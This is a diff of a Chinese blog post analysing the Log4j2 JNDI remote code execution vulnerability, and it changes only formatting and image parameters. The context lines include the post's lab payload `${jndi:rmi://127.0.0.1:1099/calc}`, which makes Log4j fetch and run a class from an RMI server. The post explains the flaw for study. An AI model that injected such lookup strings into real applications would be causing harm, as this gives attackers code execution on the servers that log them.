@@ -2,8 +2,6 @@
 date: 2021-12-12
 ---
 
-
-
 - [漏洞的前因后果](#%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%89%8D%E5%9B%A0%E5%90%8E%E6%9E%9C)
     - [漏洞描述](#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0)
     - [漏洞评级](#%E6%BC%8F%E6%B4%9E%E8%AF%84%E7%BA%A7)
@@ -25,11 +23,11 @@ date: 2021-12-12
 
 ## 漏洞描述
 
-Apache Log4j2 是一款优秀的 Java 日志框架。`2021 年 11 月 24 日，阿里云安全团队向 Apache 官方报告了 Apache Log4j2 远程代码执行漏洞。`由于 Apache Log4j2 某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证，Apache Struts2、Apache Solr、Apache Druid、Apache Flink 等均受影响。阿里云应急响应中心提醒 Apache Log4j2 用户尽快采取安全措施阻止漏洞攻击。
+Apache Log4j2 是一款优秀的 Java 日志框架。`2021 年 11 月 24 日，阿里云安全团队向 Apache 官方报告了 Apache Log4j2 远程代码执行漏洞。` 由于 Apache Log4j2 某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证，Apache Struts2、Apache Solr、Apache Druid、Apache Flink 等均受影响。阿里云应急响应中心提醒 Apache Log4j2 用户尽快采取安全措施阻止漏洞攻击。
 
 ## 漏洞评级
 
-Apache Log4j 远程代码执行漏洞 `严重`。
+Apache Log4j 远程代码执行漏洞 ` 严重 `。
 
 ## 影响版本
 
@@ -72,7 +70,7 @@ class Log4jApplicationTests {
 content Java HotSpot(TM) 64-Bit Server VM (build 25.152-b16, mixed mode)
 ```
 
-使用 JavaLookup 获取到了 JVM 的相关信息（需要使用`java`前缀）。
+使用 JavaLookup 获取到了 JVM 的相关信息（需要使用 `java` 前缀）。
 
 ## 本地获取服务器的打印信息
 
@@ -93,7 +91,7 @@ public class Server {
 }
 ```
 
-ExecCalc 类直接放在根目录，不能申请包名，即不能存在 package xxx。声明后编译的 class 文件函数名称会加上包名从而不匹配。参考 [Java 安全-RMI-JNDI 注入](https://reader-l.github.io/2021/01/26/Java%E5%AE%89%E5%85%A8-RMI-JNDI%E6%B3%A8%E5%85%A5/)。
+ExecCalc 类直接放在根目录，不能申请包名，即不能存在 package xxx。声明后编译的 class 文件函数名称会加上包名从而不匹配。参考 [Java 安全 - RMI-JNDI 注入](https://reader-l.github.io/2021/01/26/Java%E5%AE%89%E5%85%A8-RMI-JNDI%E6%B3%A8%E5%85%A5/)。
 
 ```java
 public class ExecCalc {
@@ -172,11 +170,11 @@ protected String resolveVariable(final LogEvent event, final String variableName
 }
 ```
 
-![](http://yano.oss-cn-beijing.aliyuncs.com/blog/20211214175321.png)
+![](http://yano.oss-cn-beijing.aliyuncs.com/blog/20211214175321.png?x-oss-process=image/resize,h_500)
 
 和官方文档上是能够对应上的，即 log 里只解析前缀为 `date`、`jndi` 等的命令，本文的测试用例使用的是 `${jndi:rmi://127.0.0.1:1099/calc}`。
 
-![](http://yano.oss-cn-beijing.aliyuncs.com/blog/20211214175427.png?x-oss-process=style/yano)
+![](http://yano.oss-cn-beijing.aliyuncs.com/blog/20211214175427.png?x-oss-process=image/resize,w_250)
 
 解析出参数的结果， org.apache.logging.log4j.core.lookup.Interpolator#lookup
 
@@ -188,7 +186,7 @@ public String lookup(final LogEvent event, String var) {
     }
 
     final int prefixPos = var.indexOf(PREFIX_SEPARATOR);
-    if (prefixPos >= 0) {
+    if (prefixPos>= 0) {
         final String prefix = var.substring(0, prefixPos).toLowerCase(Locale.US);
         final String name = var.substring(prefixPos + 1);
         final StrLookup lookup = strLookupMap.get(prefix);
@@ -241,12 +239,12 @@ JNDI (Java Naming and Directory Interface) 是一组应用程序接口，它为�
 
 # GitHub 项目
 
-[Java 编程思想-最全思维导图-GitHub 下载链接](https://github.com/LjyYano/Thinking_in_Java_MindMapping)，需要的小伙伴可以自取~
+[Java 编程思想 - 最全思维导图 - GitHub 下载链接](https://github.com/LjyYano/Thinking_in_Java_MindMapping)，需要的小伙伴可以自取~
 
 原创不易，希望大家转载时请先联系我，并标注原文链接。
 
 # 参考链接
 
-- [Java 安全-RMI-JNDI 注入](https://reader-l.github.io/2021/01/26/Java%E5%AE%89%E5%85%A8-RMI-JNDI%E6%B3%A8%E5%85%A5/)
+- [Java 安全 - RMI-JNDI 注入](https://reader-l.github.io/2021/01/26/Java%E5%AE%89%E5%85%A8-RMI-JNDI%E6%B3%A8%E5%85%A5/)
 - [Lesson: Overview of JNDI](https://docs.oracle.com/javase/tutorial/jndi/overview/index.html)
 - [https://logging.apache.org/log4j/2.x/manual/lookups.html](https://logging.apache.org/log4j/2.x/manual/lookups.html)
